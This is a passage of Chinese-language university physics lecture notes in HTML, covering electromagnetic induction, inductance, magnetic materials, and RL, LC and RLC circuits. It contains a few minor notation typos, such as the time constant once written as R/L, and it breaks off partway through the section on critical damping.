    \varepsilon =\oint \boldsymbol{E} \cdot d\boldsymbol{l}=\oint \dfrac{\boldsymbol{f}}{q}d\boldsymbol{l}= \oint (\boldsymbol{v} \times \boldsymbol{B}) \cdot d\boldsymbol{l}
\]</div>
</div>
<p>发电机</p>
<div align=center>
    <img src="../NOTE/Physics/img/part2/2.png" width="50%">
</div>

<div class="arithmatex">\[
    \Phi = \boldsymbol{B} \cdot \boldsymbol{S} =BS\cos\theta=BA\cos\omega t
\]</div>
<div class="arithmatex">\[
    \varepsilon = -\dfrac{d\Phi}{dt} = BA\omega\sin\omega t
\]</div>
<h2 id="note-physics-electrodynamincs-_4">感生电动势<a class="headerlink" href="#note-physics-electrodynamincs-_4" title="Permanent link">&para;</a></h2>
<p>涡旋电流</p>
<div class="arithmatex">\[
    \varepsilon = \oint \boldsymbol{E} \cdot d\boldsymbol{l}
\]</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>做功相等</p>
<div class="arithmatex">\[
    \varepsilon q_0=q_0 E_{induce} l
\]</div>
<div class="arithmatex">\[
    \varepsilon = E_{induce} l
\]</div>
<div class="arithmatex">\[
    \varepsilon = \oint \boldsymbol{E} \cdot d\boldsymbol{l}
\]</div>
<p>这提供了一种求出感生电场的方法</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div align=center>
<img src="../NOTE/Physics/img/part2/3.png" width="50%">
</div></p>
<p>磁场静止，动生电动势<span class="arithmatex">\(\varepsilon=BDv\)</span></p>
<p>磁场运动，感生电动势</p>
<div class="arithmatex">\[
    \varepsilon=\oint E dl=ED=BDv
\]</div>
<div class="arithmatex">\[
    E=v \times B
\]</div>
</div>
</div>
<p>变化的磁场</p>
<div class="arithmatex">\[
    \varepsilon = -\frac{d\Phi}{dt}=-A \frac{dB}{dt}
\]</div>
<div class="admonition info">
<p class="admonition-title">推广电场环路定律</p>
<div class="arithmatex">\[
    \oint (\boldsymbol{E_{sta}+E_{ind}}) \cdot d\boldsymbol{l} =0+( -\frac{d\Phi}{dt})
\]</div>
<div class="arithmatex">\[
    \Phi = \iint \boldsymbol{B} \cdot d\boldsymbol{S}
\]</div>
<div class="arithmatex">\[
    \oint \boldsymbol{E} \cdot d\boldsymbol{l} = -\frac{d\Phi}{dt}= - \iint \frac{\partial \boldsymbol{B}}{\partial t} \cdot d\boldsymbol{S}
\]</div>
<p>运用stokes公式</p>
<div class="arithmatex">\[
  \nabla \times \boldsymbol{E} = -\frac{\partial \boldsymbol{B}}{\partial t}
\]</div>
</div>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>在涡旋电场中，环路积分并不是0，所以在涡旋电场中不能使用电势的概念</p>
</div>
<h2 id="note-physics-electrodynamincs-_5">电感<a class="headerlink" href="#note-physics-electrodynamincs-_5" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-electrodynamincs-_6">互感<a class="headerlink" href="#note-physics-electrodynamincs-_6" title="Permanent link">&para;</a></h3>
<div align=center>
    <img src="../NOTE/Physics/img/part2/4.png" width="50%">
</div>

<p><span class="arithmatex">\(i_1\)</span>产生的磁场会使得<span class="arithmatex">\(s_2\)</span>感应出<span class="arithmatex">\(\varepsilon_2\)</span></p>
<p><span class="arithmatex">\(i_2\)</span>产生的磁场会使得<span class="arithmatex">\(s_1\)</span>感应出<span class="arithmatex">\(\varepsilon_1\)</span></p>
<p>由<span class="arithmatex">\(s_1\)</span>在<span class="arithmatex">\(s_2\)</span>上导致的磁通匝链数</p>
<div class="arithmatex">\[
    \Psi_{12} \propto N_2A_2B_1 \propto N_2\Phi_1 = M_{12}i_1
\]</div>
<p>由<span class="arithmatex">\(s_2\)</span>在<span class="arithmatex">\(s_1\)</span>上导致的磁通匝链数</p>
<div class="arithmatex">\[
    \Psi_{21} \propto N_1A_1B_2 \propto N_1\Phi_2 = M_{21}i_2
\]</div>
<div class="arithmatex">\[
M_{12} = \frac{\Psi_{12}}{i_1} = \frac{N_2 \Phi_{12}}{i_1}; \quad \varepsilon_2 = -\frac{d\Psi_{12}}{dt} = -M_{12} \frac{di_1}{dt}, \quad (i_1 \text{ change})
\]</div>
<div class="arithmatex">\[
M_{21} = \frac{\Psi_{21}}{i_2} = \frac{N_1 \Phi_{21}}{i_2}; \quad \varepsilon_1 = -\frac{d\Psi_{21}}{dt} = -M_{21} \frac{di_2}{dt}, \quad (i_2 \text{ change})
\]</div>
<div class="admonition definition">
<p class="admonition-title">互感系数</p>
<p>如上的<span class="arithmatex">\(M_{12}\)</span>和<span class="arithmatex">\(M_{21}\)</span>就是被称为互感系数，单位为亨利(Hery)</p>
<div class="arithmatex">\[
    1H=1\dfrac{Wb}{A}
\]</div>
<p>常见的有<span class="arithmatex">\(mH,\mu H\)</span>等</p>
</div>
<h3 id="note-physics-electrodynamincs-_7">自感<a class="headerlink" href="#note-physics-electrodynamincs-_7" title="Permanent link">&para;</a></h3>
<div align=center>
    <img src="../NOTE/Physics/img/part2/5.png" width="50%"> 
</div>

<p>类似的有</p>
<div class="arithmatex">\[
    \Psi = NBA =Li
\]</div>
<div class="arithmatex">\[
    \varepsilon_{L}= -\dfrac{d\Psi}{dt}=-L\dfrac{di}{dt} =V_b-V_a
\]</div>
<p>其中<span class="arithmatex">\(L\)</span>被称为自感系数</p>
<h4 id="note-physics-electrodynamincs-_8">通电螺线管的自感系数<a class="headerlink" href="#note-physics-electrodynamincs-_8" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/part2/6.png" width="50%">
</div>

<p><span class="arithmatex">\(n\)</span>为单位长度的匝数</p>
<p><strong>磁场强度</strong></p>
<div class="arithmatex">\[ 
B = \mu_0 n i 
\]</div>
<p><strong>磁通匝链数</strong></p>
<div class="arithmatex">\[
\psi = N \Phi_B = n l BA = \mu_0 n^2 i l A 
\]</div>
<p><strong>自感系数</strong></p>
<div class="arithmatex">\[
L = \frac{\psi}{i} = \mu_0 n^2 l A = \mu_0 n^2 V 
\]</div>
<p><strong>单位体积的自感系数</strong></p>
<div class="arithmatex">\[
L_v = \frac{L}{V} = \mu_0 n^2 
\]</div>
<p><strong>单位长度的自感系数</strong></p>
<div class="arithmatex">\[
L_l = \frac{L}{l} = \mu_0 n^2 A 
\]</div>
<h4 id="note-physics-electrodynamincs-_9">长方形截面螺绕环<a class="headerlink" href="#note-physics-electrodynamincs-_9" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/part2/7.png" width="50%">
</div>

<div class="arithmatex">\[
\int \mathbf{B} \cdot d\mathbf{l} = \mu_0 Ni
\]</div>
<div class="arithmatex">\[
B = \frac{\mu_0 i N}{2 \pi r}
\]</div>
<div class="arithmatex">\[
\Phi_B = \int \int \mathbf{B} \cdot d\mathbf{A} = \int_a^b \frac{\mu_0 i N}{2 \pi r} h dr
\]</div>
<div class="arithmatex">\[
= \frac{\mu_0 i N h}{2 \pi} \int_a^b \frac{dr}{r} = \frac{\mu_0 i N h}{2 \pi} \ln \frac{b}{a}
\]</div>
<div class="arithmatex">\[
\therefore L = \frac{N \Phi_B}{i} = \frac{\mu_0 N^2 h}{2 \pi} \ln \frac{b}{a}
\]</div>
<h4 id="note-physics-electrodynamincs-_10">同轴电缆<a class="headerlink" href="#note-physics-electrodynamincs-_10" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/part2/8.png" width="50%">
</div>

<div class="arithmatex">\[
\int \mathbf{B} \cdot d\mathbf{l} = \mu_0 i,
\]</div>
<div class="arithmatex">\[
B = \frac{\mu_0 i}{2 \pi r}
\]</div>
<div class="arithmatex">\[
\Phi_B = \iint \mathbf{B} \cdot d\mathbf{A} = \int_{R_1}^{R_2} Bl \, dr
\]</div>
<div class="arithmatex">\[
= \frac{\mu_0 il}{2 \pi} \int_{R_1}^{R_2} \frac{dr}{r} = \frac{\mu_0 il}{2 \pi} \ln\left(\frac{R_2}{R_1}\right)
\]</div>
<div class="arithmatex">\[
\therefore L = \frac{\Phi_B}{i} = \frac{\mu_0l}{2 \pi} \ln\left(\frac{R_2}{R_1}\right)
\]</div>
<h4 id="note-physics-electrodynamincs-_11">线圈拼接<a class="headerlink" href="#note-physics-electrodynamincs-_11" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/part2/9.png" width="50%">
</div>

<p>其互感系数为</p>
<div class="arithmatex">\[
    M=\sqrt{L_1L_2}
\]</div>
<p>自感系数为</p>
<p>顺接</p>
<div class="arithmatex">\[
    L=L_1+L_2+2M
\]</div>
<p>反接</p>
<div class="arithmatex">\[
    L=L_1+L_2-2M
\]</div>
<h2 id="note-physics-electrodynamincs-_12">材料的磁性质<a class="headerlink" href="#note-physics-electrodynamincs-_12" title="Permanent link">&para;</a></h2>
<p>在电容器中间插入电介质，可以让电容增大</p>
<div class="arithmatex">\[
    C=\kappa_e C_0
\]</div>
<p>在通电螺线管中插入铁磁材料，同样可以为自感系数增大</p>
<div class="arithmatex">\[
    L=\kappa_m L_0
\]</div>
<p>其中<span class="arithmatex">\(\kappa_m\)</span>被称为磁导率</p>
<p>对于顺磁性材料，其磁导率约为1；对于铁磁性材料，其磁导率远大于1(<span class="arithmatex">\(10^3 \sim 10^4\)</span>)</p>
<h3 id="note-physics-electrodynamincs-_13">价电子的磁偶极矩<a class="headerlink" href="#note-physics-electrodynamincs-_13" title="Permanent link">&para;</a></h3>
<div align=center>
    <img src="../NOTE/Physics/img/part2/10.png" width="50%">
</div>

<div class="arithmatex">\[
\mu = iA
\]</div>
<div class="arithmatex">\[
i = \frac{e}{T} = \frac{e}{2\pi r/v} = \frac{ev}{2\pi r}
\]</div>
<div class="arithmatex">\[
\therefore \mu = iA = \frac{ev}{2\pi r} \cdot \left(\pi r^2\right) = \frac{1}{2} erv
\]</div>
<p>角动量为</p>
<div class="arithmatex">\[
L = mvr
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    \boldsymbol{\mu_l}=-\dfrac{e}{2m}\boldsymbol{L}
\]</div>
<div class="arithmatex">\[
    \boldsymbol{L}=\sqrt{L(L+1)}\dfrac{h}{2\pi}=\sqrt{L(L+1)}\hbar
\]</div>
<h3 id="note-physics-electrodynamincs-_14">自旋的磁偶极矩<a class="headerlink" href="#note-physics-electrodynamincs-_14" title="Permanent link">&para;</a></h3>
<h4 id="note-physics-electrodynamincs-_15">自旋角动量<a class="headerlink" href="#note-physics-electrodynamincs-_15" title="Permanent link">&para;</a></h4>
<table>
<thead>
<tr>
<th>Particle</th>
<th>Spin</th>
<th>Type</th>
</tr>
</thead>
<tbody>
<tr>
<td>Electron</td>
<td><span class="arithmatex">\( s = \frac{1}{2} \hbar \)</span></td>
<td>Fermi</td>
</tr>
<tr>
<td>Proton</td>
<td><span class="arithmatex">\( s = \frac{1}{2} \hbar \)</span></td>
<td>Fermi</td>
</tr>
<tr>
<td>Neutron</td>
<td><span class="arithmatex">\( s = \frac{1}{2} \hbar \)</span></td>
<td>Fermi</td>
</tr>
<tr>
<td>Deuteron</td>
<td><span class="arithmatex">\( s = \hbar \)</span></td>
<td>Bose</td>
</tr>
<tr>
<td>Alpha Particle</td>
<td><span class="arithmatex">\( s = 0 \)</span></td>
<td>Bose</td>
</tr>
</tbody>
</table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><span class="arithmatex">\(\hbar=\dfrac{h}{2\pi}\)</span> 为约化普朗克常数</p>
</div>
<h4 id="note-physics-electrodynamincs-_16">自旋磁矩<a class="headerlink" href="#note-physics-electrodynamincs-_16" title="Permanent link">&para;</a></h4>
<div class="arithmatex">\[
    \boldsymbol{\mu_s}=-\dfrac{e}{m}\boldsymbol{S}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>总磁矩</p>
<div class="arithmatex">\[
    \boldsymbol{\mu}=\boldsymbol{\mu_l}+\boldsymbol{\mu_s}=-\dfrac{e}{2m}\boldsymbol{J}
\]</div>
<div class="arithmatex">\[
    \boldsymbol{J}=\boldsymbol{L}+2\boldsymbol{S}
\]</div>
</div>
<h3 id="note-physics-electrodynamincs-m">磁化强度<span class="arithmatex">\(M\)</span><a class="headerlink" href="#note-physics-electrodynamincs-m" title="Permanent link">&para;</a></h3>
<blockquote>
<p>在电容部分，我们引入了极化强度<span class="arithmatex">\(P\)</span>，在磁场部分，我们也类似的引入磁化强度<span class="arithmatex">\(M\)</span>用于刻画磁性材料的磁性质</p>
</blockquote>
<div align=center>
    <img src="../NOTE/Physics/img/part2/11.png" width="30%">
</div>

<p>向通电螺线管中插入铁磁材料，原本杂乱无章的分子磁矩会受到磁场的作用，使得磁矩方向趋于一致，朝向磁场方向，在宏观上相当于在材料外围产生了一个电流</p>
<div align=center>
    <img src="../NOTE/Physics/img/part2/12.png" width="30%">
</div>

<p>此时磁场被增强</p>
<div class="arithmatex">\[
    \boldsymbol{B}=\boldsymbol{B_0}+\boldsymbol{B'_{M}}
\]</div>
<div class="admonition definition">
<p class="admonition-title">磁化强度矢量</p>
<p>我们定义磁化强度矢量<span class="arithmatex">\(\boldsymbol{M}\)</span>为单位体积内磁矩的矢量和，即</p>
<div class="arithmatex">\[
    \boldsymbol{M}=\dfrac{\sum \boldsymbol{\mu}}{V}
\]</div>
</div>
<p>我们也希望磁化强度矢量有类似于极化强度矢量的性质，即</p>
<div class="arithmatex">\[
    \oint \boldsymbol{M} \cdot d\boldsymbol{l} = \sum i_{in}  \enspace  (\oiint \boldsymbol{P} \cdot d\boldsymbol{A} = -\sum q_{in})
\]</div>
<div class="arithmatex">\[
    \boldsymbol{M} \cdot \boldsymbol{n} = j' \enspace (\boldsymbol{P} \cdot \boldsymbol{n} = \sigma_{surf})
\]</div>
<div align=center>
    <img src="../NOTE/Physics/img/part2/13.png" width="30%">
</div>

<p>红色的是电流，电流面密度为</p>
<div class="arithmatex">\[
j' = \frac{i}{\Delta z}
\]</div>
<p>只用除以<span class="arithmatex">\(\Delta z\)</span>是因为我们只考虑到了表面的电流，即其向<span class="arithmatex">\(y\)</span>的方向是没有的</p>
<div class="arithmatex">\[
\Delta m = i' \cdot \Delta A = j' \Delta x \Delta y \Delta z
\]</div>
<div class="arithmatex">\[
M = \frac{\Delta m}{\Delta V} = j'
\]</div>
<div class="arithmatex">\[
M \cdot \Delta z = i'
\]</div>
<h2 id="note-physics-electrodynamincs-_17">磁场强度<a class="headerlink" href="#note-physics-electrodynamincs-_17" title="Permanent link">&para;</a></h2>
<div align=center>
    <img src="../NOTE/Physics/img/part2/14.png" width="30%">
</div>

<p>由环路定律</p>
<div class="arithmatex">\[
\oint_L \boldsymbol{B} \cdot d\boldsymbol{l} = \mu_0 \sum_{inL} (i_0 + i') = \mu_0 \sum_{inL} i_0 + \mu_0 \oint_L \boldsymbol{M} \cdot d\boldsymbol{l}
\]</div>
<div class="arithmatex">\[
\oint_L \left( \frac{\boldsymbol{B}}{\mu_0} - \boldsymbol{M} \right) \cdot d\boldsymbol{l} = \sum_{inL} i_0
\]</div>
<p>定义磁场强度为</p>
<div class="arithmatex">\[
   \boldsymbol{H} = \frac{\boldsymbol{B}}{\mu_0} - \boldsymbol{M}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>磁化强度和磁场强度的关系为</p>
<div class="arithmatex">\[
    \boldsymbol{M}= \chi_m \boldsymbol{H}
\]</div>
<p>那么</p>
<div class="arithmatex">\[
    \boldsymbol{B}=\mu_0(\boldsymbol{H}+\boldsymbol{M})=\mu_0(1+\chi_m)\boldsymbol{H}= \mu_0 \kappa_m \boldsymbol{H}
\]</div>
<p>则 <span class="arithmatex">\(\kappa_m=1+\chi_m\)</span>    </p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>在上面的例子中，我们可以得到</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/part2/15.png" width="30%">
</div></p>
<div class="arithmatex">\[
   \oint_L \boldsymbol{H} \cdot d\boldsymbol{l} = \sum_{inL} i_0
\]</div>
<div class="arithmatex">\[
    \boldsymbol{H} \cdot \Delta \boldsymbol{l} = N i_0 \ \Rightarrow \ H = n i_0
\]</div>
<div class="arithmatex">\[
    B = \mu_0 \kappa_m H = \mu_0 \kappa_m n i_0 = \kappa_m B_0
\]</div>
</div>
<div class="admonition idea">
<p class="admonition-title">Idea</p>
<p>以这样的角度来看，磁场强度<span class="arithmatex">\(H\)</span>和电场强度<span class="arithmatex">\(E\)</span>，磁感应强度<span class="arithmatex">\(B\)</span>和电感应强度<span class="arithmatex">\(D\)</span>的关系又是可以对应的</p>
<div class="arithmatex">\[
    D = \varepsilon_0 E+P=\varepsilon_0 \kappa_e E
\]</div>
<div class="arithmatex">\[
    B = \mu_0(H+M)=\mu_0 \kappa_m H
\]</div>
</div>
<h3 id="note-physics-electrodynamincs-_18">磁化率与磁导率<a class="headerlink" href="#note-physics-electrodynamincs-_18" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th></th>
<th>顺磁</th>
<th>抗磁</th>
<th>铁磁</th>
</tr>
</thead>
<tbody>
<tr>
<td><span class="arithmatex">\(\chi_m\)</span></td>
<td>大于0但是小(<span class="arithmatex">\(10^{-6}\)</span>)</td>
<td>小于0但绝对值远小于1</td>
<td>与磁场强度有关</td>
</tr>
<tr>
<td><span class="arithmatex">\(\kappa_m\)</span></td>
<td>大于1但是接近1</td>
<td>小于1但是接近1</td>
<td>与磁场强度有关(<span class="arithmatex">\(10^2 \sim 10^3\)</span>)</td>
</tr>
</tbody>
</table>
<h3 id="note-physics-electrodynamincs-_19">微观解释<a class="headerlink" href="#note-physics-electrodynamincs-_19" title="Permanent link">&para;</a></h3>
<h4 id="note-physics-electrodynamincs-paramegnetic-material">顺磁材料(paramegnetic material)<a class="headerlink" href="#note-physics-electrodynamincs-paramegnetic-material" title="Permanent link">&para;</a></h4>
<p>原本杂乱无章的磁矩，在外磁场下，材料内部的磁矩会朝向磁场方向,但是与温度有关</p>
<div align=center>
    <img src="../NOTE/Physics/img/part2/16.png" width="30%">
</div>

<p><strong>居里定律</strong></p>
<div class="arithmatex">\[
    \boldsymbol{M}=\chi_m\boldsymbol{H} \enspace \chi_m = \dfrac{C}{T}
\]</div>
<p>其中<span class="arithmatex">\(C\)</span>为居里常数，<span class="arithmatex">\(T\)</span>为温度</p>
<p>顺磁性的磁化率很小，磁化强度也很小，对磁场的影响很小</p>
<h4 id="note-physics-electrodynamincs-diamagnetic-material">抗磁材料(diamagnetic material)<a class="headerlink" href="#note-physics-electrodynamincs-diamagnetic-material" title="Permanent link">&para;</a></h4>
<p>抗磁材料在没有外磁场的情况下，内部总磁矩为0;即：</p>
<div class="arithmatex">\[
    \boldsymbol{\mu}=\boldsymbol{0} \enspace \boldsymbol{J}=\boldsymbol{0}
\]</div>
<div align=center>
    <img src="../NOTE/Physics/img/part2/17.png" width="30%">
</div>

<p>原本电子磁矩相消，加上外磁场后，电受到洛伦兹力，不管它是被加速还是被减速，都会产生一个与外磁场方向相反的磁矩(<strong><em>抗磁</em></strong>);</p>
<div class="arithmatex">\[
\frac{Ze^2}{4\pi \varepsilon_0 r^2} = m \omega_0^2 r
\]</div>
<div class="arithmatex">\[
\omega_0 = \left( \frac{Ze^2}{4\pi \varepsilon_0 m r^3} \right)^{1/2}
\]</div>
<div class="arithmatex">\[
\frac{Ze^2}{4\pi \varepsilon_0 r^2} + e \omega r B = m \omega^2 r
\]</div>
<div class="arithmatex">\[
\omega = \omega_0 + \Delta \omega
\]</div>
<div class="arithmatex">\[
\Delta \omega = \frac{eB}{2m}
\]</div>
<p>增加的力与库仑力相比要小的多，产生的磁场也比顺磁材料感应的磁场小得多，对轨道半径几乎没有影响</p>
<p>其磁矩的变化为</p>
<div class="arithmatex">\[
u = iA = \frac{ev}{2\pi r} \left( \pi r^2 \right) = \frac{1}{2} evr = \frac{e r^2}{2} \omega, \quad \boldsymbol{\mu_0} = -\frac{e r^2}{2} \boldsymbol{\omega_0}
\]</div>
<div class="arithmatex">\[
\Delta \boldsymbol{\mu} = -\frac{e r^2}{2} \Delta \boldsymbol{\omega} = -\frac{e^2 r^2}{4m} \boldsymbol{B}
\]</div>
<h4 id="note-physics-electrodynamincs-ferromagnetic-material">铁磁材料(ferromagnetic material)<a class="headerlink" href="#note-physics-electrodynamincs-ferromagnetic-material" title="Permanent link">&para;</a></h4>
<p>初始的<span class="arithmatex">\(\mu \neq 0\)</span>,且近邻原子磁矩间存在强相互作用</p>
<p>磁化强度矢量与温度的关系</p>
<div align=center>
    <img src="../NOTE/Physics/img/part2/18.png" width="30%">
</div>

<div align=center>
    <img src="../NOTE/Physics/img/part2/19.png" width="30%">
</div>

<p><strong><em>居里-维斯定理</em></strong></p>
<div class="arithmatex">\[
    \chi_m=\dfrac{C}{T-\theta}
\]</div>
<h3 id="note-physics-electrodynamincs-_20">磁畴<a class="headerlink" href="#note-physics-electrodynamincs-_20" title="Permanent link">&para;</a></h3>
<p>即使在没有外加磁场B的情况下，磁性材料中的磁偶极子（磁性小区域）也会倾向于在小范围内强烈地排列成特定的方向，形成所谓的“磁畴”。当施加外部磁场时，这些磁畴会重新排列，使得它们的方向一致，从而产生大的净磁化强度。</p>
<div align=center>
    <img src="../NOTE/Physics/img/磁畴.png" width="60%">
</div>

<ul>
<li>
<p>软铁磁体：指的是容易被磁化和退磁的磁性材料。它们在外部磁场作用下磁畴会有序排列，但磁场移除后磁畴会很快随机化。</p>
</li>
<li>
<p>硬铁磁体：指的是不易被退磁的磁性材料，例如某些特殊合金。它们在外部磁场移除后仍能保持磁畴的有序排列，因此具有较强的磁性。</p>
</li>
<li>
<p>永久磁体：通常指永久保持磁性的材料，例如稀土磁铁。它们的磁畴在没有外力作用下不会随机化，但可以通过施加外力（如磁场或震动）来改变磁畴的方向。</p>
</li>
<li>
<p>居里点：是磁性材料的一个物理特性，指的是材料由铁磁性变为顺磁性的转变温度。对于铁来说，这个温度是770摄氏度。</p>
</li>
</ul>
<h2 id="note-physics-electrodynamincs-rl-">RL-回路<a class="headerlink" href="#note-physics-electrodynamincs-rl-" title="Permanent link">&para;</a></h2>
<div class="admonition note">
<p class="admonition-title">RC回路</p>
<p><div align=center>
    <img src="https://raw.githubusercontent.com/kailqq/cdn_img/master/img/202411130900871.png" width="30%">
</div></p>
<div class="arithmatex">\[
iR + \frac{q}{C} = \epsilon
\]</div>
<div class="arithmatex">\[
\frac{dq}{dt} + \frac{1}{RC} q = \frac{\epsilon}{R}
\]</div>
<div class="arithmatex">\[
q = C\epsilon\left(1 - e^{-t/RC}\right)
\]</div>
</div>
<div align=center>
    <img src="../NOTE/Physics/img/part2/20.png" width="30%">
</div>

<h3 id="note-physics-electrodynamincs-a">开关打到a<a class="headerlink" href="#note-physics-electrodynamincs-a" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
iR + L \frac{di}{dt} = \varepsilon
\]</div>
<div class="arithmatex">\[
\frac{di}{dt} = \frac{1}{L} \left( \varepsilon - iR \right) = -\frac{R}{L} \left( i - \frac{\varepsilon}{R} \right)
\]</div>
<div class="arithmatex">\[
i - \frac{\varepsilon}{R} = C'e^{-\frac{R}{L}t}
\]</div>
<p>When <span class="arithmatex">\( t = 0, i = 0 \)</span>, thus <span class="arithmatex">\( C' = -\frac{\varepsilon}{R} \)</span>.</p>
<p>所以</p>
<div class="arithmatex">\[
i = \frac{\varepsilon}{R}\left(1 - e^{-\frac{R}{L}t}\right) = \frac{\varepsilon}{R}\left(1 - e^{-\frac{t}{\tau_L}}\right)
\]</div>
<div class="arithmatex">\[
\tau_L = \frac{L}{R}
\]</div>
<div class="arithmatex">\[
V_L = -L \frac{di}{dt} = -\varepsilon e^{-\frac{t}{\tau_L}}
\]</div>
<p><mark class="critic">时间常数<span class="arithmatex">\(\frac{R}{L}\)</span></mark></p>
<div align=center>
    <img src="../NOTE/Physics/img/RL.png" width="50%">
</div>

<p>对于电流</p>
<div class="arithmatex">\[
    i = \dfrac{\varepsilon}{R}(1-e^{-\frac{-Rt}{L}})
\]</div>
<p>最大是<span class="arithmatex">\(\dfrac{\varepsilon}{R}\)</span>，在<span class="arithmatex">\(t=L/R\)</span>达到最大值的<span class="arithmatex">\(63\%\)</span></p>
<p>对于电压</p>
<div class="arithmatex">\[
    V_L = L\dfrac{di}{dt}=-\varepsilon e^{-\frac{-Rt}{L}}
\]</div>
<p>最大是<span class="arithmatex">\(\varepsilon\)</span>，在<span class="arithmatex">\(t=L/R\)</span>达到最大值的<span class="arithmatex">\(37\%\)</span></p>
<h3 id="note-physics-electrodynamincs-b">开关打到b<a class="headerlink" href="#note-physics-electrodynamincs-b" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
    iR + L \frac{di}{dt} = 0
\]</div>
<div class="arithmatex">\[
    \frac{di}{dt} = -\frac{R}{L}i
\]</div>
<div class="arithmatex">\[
    i = i_0 e^{-\frac{R}{L}t}
\]</div>
<p><span class="arithmatex">\(t=0\)</span>,<span class="arithmatex">\(i_0=\dfrac{\varepsilon}{R}\)</span></p>
<div class="arithmatex">\[
    i = \dfrac{\varepsilon}{R}e^{-\frac{R}{L}t}
\]</div>
<div align=center>
    <img src="../NOTE/Physics/img/RLoff.png" width="50%">
</div>

<p>对于电流，在<span class="arithmatex">\(L/R\)</span>时间后，电流减少到原来的<span class="arithmatex">\(37\%\)</span></p>
<p>对于电压,在<span class="arithmatex">\(L/R\)</span>时间后，电压减少到原来的<span class="arithmatex">\(37\%\)</span></p>
<h3 id="note-physics-electrodynamincs-_21">线圈的能量<a class="headerlink" href="#note-physics-electrodynamincs-_21" title="Permanent link">&para;</a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>回忆电容器的能量</p>
<div class="arithmatex">\[
    U = \frac{1}{2} CV^2  \enspace u_e=\dfrac{1}{2}\varepsilon E^2
\]</div>
</div>
<div align=center>
    <img src="../NOTE/Physics/img/solenoid.png" width="30%">
</div>

<div class="arithmatex">\[
    dW = -\varepsilon dq = -\varepsilon i dt =  Lidi
\]</div>
<div class="arithmatex">\[
    W = \int_0^I Lidi = \frac{1}{2} LI^2
\]</div>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>如果是互感线圈，那么 <span class="arithmatex">\(W=MI_1I_2\)</span></p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>磁场的能量密度</p>
<div class="arithmatex">\[
    u_m = \dfrac{1}{2\mu_0}B^2
\]</div>
<p>总结</p>
<p><span class="arithmatex">\(\mu_B=\dfrac{1}{2}\boldsymbol{B} \cdot \boldsymbol{H}\)</span></p>
<p><span class="arithmatex">\(\mu_E=\dfrac{1}{2}\boldsymbol{D} \cdot \boldsymbol{E}\)</span></p>
</div>
<h2 id="note-physics-electrodynamincs-_22">电磁振荡<a class="headerlink" href="#note-physics-electrodynamincs-_22" title="Permanent link">&para;</a></h2>
<div align=center>
    <img src="../NOTE/Physics/img/LC.png" width="60%">
</div>

<p>电容电场能和线圈磁场能量相互转化</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>可以类比于弹簧振子，弹簧的势能和动能相互转化</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/spring.png" width="50%">
</div></p>
<p><span class="arithmatex">\(q\)</span>-&gt;弹簧的位移<span class="arithmatex">\(x\)</span>,<span class="arithmatex">\(i\)</span>-&gt;弹簧的速度<span class="arithmatex">\(v\)</span>,<span class="arithmatex">\(\dfrac{1}{C}\)</span>-&gt;弹簧的劲度系数<span class="arithmatex">\(k\)</span>,<span class="arithmatex">\(L\)</span>-&gt;弹簧的质量<span class="arithmatex">\(m\)</span></p>
<div class="arithmatex">\[
    \omega=\dfrac{1}{\sqrt{LC}}
\]</div>
</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<div class="arithmatex">\[
  U = U_B + U_E = \frac{1}{2} Li^2 + \frac{1}{2} \frac{q^2}{C}
\]</div>
<div class="arithmatex">\[
  \frac{dU}{dt} = Li \frac{di}{dt} + \frac{q}{C} \frac{dq}{dt} = Li \frac{d^2 q}{dt^2} + \frac{q}{C} i = 0
\]</div>
<div class="arithmatex">\[
   \frac{d^2 q}{dt^2} + \frac{1}{LC} q = 0
\]</div>
<div class="arithmatex">\[
   \left( \frac{d^2 x}{dt^2} + \frac{k}{m} x = 0 \right)
\]</div>
<div class="arithmatex">\[
   \omega = \sqrt{\frac{k}{m}} = \frac{1}{\sqrt{LC}}
\]</div>
</div>
<h3 id="note-physics-electrodynamincs-_23">阻尼和受迫振动<a class="headerlink" href="#note-physics-electrodynamincs-_23" title="Permanent link">&para;</a></h3>
<h4 id="note-physics-electrodynamincs-rlc">RLC电路<a class="headerlink" href="#note-physics-electrodynamincs-rlc" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/RLC.png" width="30%">
</div>

<p>对于开关打到a和b的情况，我们可以得到</p>
<div class="arithmatex">\[
L \frac{di}{dt} + iR + \frac{q}{C} = 
\begin{cases} 
\varepsilon &amp; \text{K} \to a \\ 
0 &amp; \text{K} \to b 
\end{cases}
\]</div>
<p>即</p>
<div class="arithmatex">\[
i = \frac{dq}{dt}, \quad
L \frac{d^2 q}{dt^2} + R \frac{dq}{dt} + \frac{1}{C} q = 
\begin{cases} 
\varepsilon &amp; \\ 
0 &amp; 
\end{cases}
\]</div>
<p><strong>过阻尼</strong></p>
<p>当</p>
<div class="arithmatex">\[
R^2 &gt; \frac{4L}{C}
\]</div>
<p>此时为过阻尼震荡</p>
<figure>
  <img align="align" alt="Image title" src="../NOTE/Physics/img/chargin.png" />
<br />
<figcaption>charging</figcaption>
</figure>
<figure>
  <img align="align" alt="Image title" src="../NOTE/Physics/img/dischar.png" />
<br />
<figcaption>discharging</figcaption>
</figure>
<p><strong>临界阻尼</strong></p>
<p>当</p>
